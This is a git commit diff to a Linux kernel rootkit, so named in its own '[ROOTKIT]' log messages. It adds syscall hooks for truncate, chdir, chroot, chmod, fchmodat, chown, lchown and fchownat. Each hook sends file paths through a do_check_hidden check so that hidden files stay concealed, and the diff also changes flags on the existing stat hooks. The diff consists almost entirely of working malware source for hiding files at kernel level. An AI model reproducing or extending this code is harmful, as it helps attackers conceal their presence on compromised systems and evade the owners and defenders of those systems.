085b596e93187c1dc5d8127a76ad8ef9373b9e4d
MaT-PT <MaT-PT@users.noreply.github.com>
2023-10-30 15:00:26 +0100

    Hook truncate, chdir, chroot, chmod*, chown*

--- src/syscall_hooks/open_stat.c
+++ src/syscall_hooks/open_stat.c
@@ -151,8 +151,7 @@ SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const c
 {
     pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %d)\n", i32_dfd, s_filename, p_statbuf, i32_flag);
 
-    return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename,
-                           i32_flag | AT_NO_AUTOMOUNT);
+    return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename, i32_flag);
 }
 
 // sys_statx syscall hook handler
@@ -163,5 +162,75 @@ SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user
     pr_info("[ROOTKIT] statx(%d, %p, %u, %u, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
             p_buffer);
 
-    return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags | AT_NO_AUTOMOUNT);
+    return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags);
+}
+
+// sys_truncate syscall hook handler
+SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_filename, long,
+                      i64_length)
+{
+    pr_info("[ROOTKIT] truncate(%p, %ld)\n", s_filename, i64_length);
+
+    return do_check_hidden(orig_truncate, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_chdir syscall hook handler
+SYSCALL_HOOK_HANDLER1(chdir, orig_chdir, p_regs, const char __user *, s_filename)
+{
+    pr_info("[ROOTKIT] chdir(%p)\n", s_filename);
+
+    return do_check_hidden(orig_chdir, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_chroot syscall hook handler
+SYSCALL_HOOK_HANDLER1(chroot, orig_chroot, p_regs, const char __user *, s_filename)
+{
+    pr_info("[ROOTKIT] chroot(%p)\n", s_filename);
+
+    return do_check_hidden(orig_chroot, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_chmod syscall hook handler
+SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename, umode_t,
+                      ui16_mode)
+{
+    pr_info("[ROOTKIT] chmod(%p, 0%ho)\n", s_filename, ui16_mode);
+
+    return do_check_hidden(orig_chmod, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_fchmodat syscall hook handler
+SYSCALL_HOOK_HANDLER3(fchmodat, orig_fchmodat, p_regs, int, i32_dfd, const char __user *,
+                      s_filename, umode_t, ui16_mode)
+{
+    pr_info("[ROOTKIT] fchmodat(%d, %p, 0%ho)\n", i32_dfd, s_filename, ui16_mode);
+
+    return do_check_hidden(orig_fchmodat, p_regs, i32_dfd, s_filename, 0);
+}
+
+// sys_chown syscall hook handler
+SYSCALL_HOOK_HANDLER3(chown, orig_chown, p_regs, const char __user *, s_filename, uid_t, ui32_user,
+                      gid_t, ui32_group)
+{
+    pr_info("[ROOTKIT] chown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
+
+    return do_check_hidden(orig_chown, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_lchown syscall hook handler
+SYSCALL_HOOK_HANDLER3(lchown, orig_lchown, p_regs, const char __user *, s_filename, uid_t,
+                      ui32_user, gid_t, ui32_group)
+{
+    pr_info("[ROOTKIT] lchown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);
+
+    return do_check_hidden(orig_lchown, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
+}
+
+// sys_fchownat syscall hook handler
+SYSCALL_HOOK_HANDLER4(fchownat, orig_fchownat, p_regs, int, i32_dfd, const char __user *,
+                      s_filename, uid_t, ui32_user, gid_t, ui32_group)
+{
+    pr_info("[ROOTKIT] fchownat(%d, %p, %u, %u)\n", i32_dfd, s_filename, ui32_user, ui32_group);
+
+    return do_check_hidden(orig_fchownat, p_regs, i32_dfd, s_filename, 0);
 }
